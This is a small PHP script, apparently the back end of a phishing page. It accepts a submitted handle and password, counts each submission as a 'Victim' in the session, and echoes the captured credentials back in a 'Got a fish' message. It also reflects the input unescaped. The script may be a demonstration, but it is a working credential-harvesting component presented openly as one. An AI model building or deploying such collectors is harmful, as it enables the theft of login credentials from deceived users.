<?php
	session_start();

	if( empty($_POST) ){
		$_POST = (array)json_decode(file_get_contents('php://input', true));
	}

	function _return($msg, $status = 200){
		http_response_code($status);
		echo $msg;
		exit;
	}

	# Reset the number of login
	if( isset( $_GET['reset'] ) ){
		$_SESSION['count'] = 0;
		_return("Reset successful");
	}
	
	# Count the number of login
	if( isset( $_POST['handle'] ) && isset( $_POST['password'] ) ){
		if( isset( $_SESSION['count'] ) ){
			$_SESSION['count']++;
		}else{
			$_SESSION['count'] = 0;
		}
		_return("Got a fish named `" . $_POST['handle'] . "` and password `". $_POST['password'] ."`! | Victim: ". $_SESSION['count']);
	}else{
		_return("Invalid", 500);
	}
?>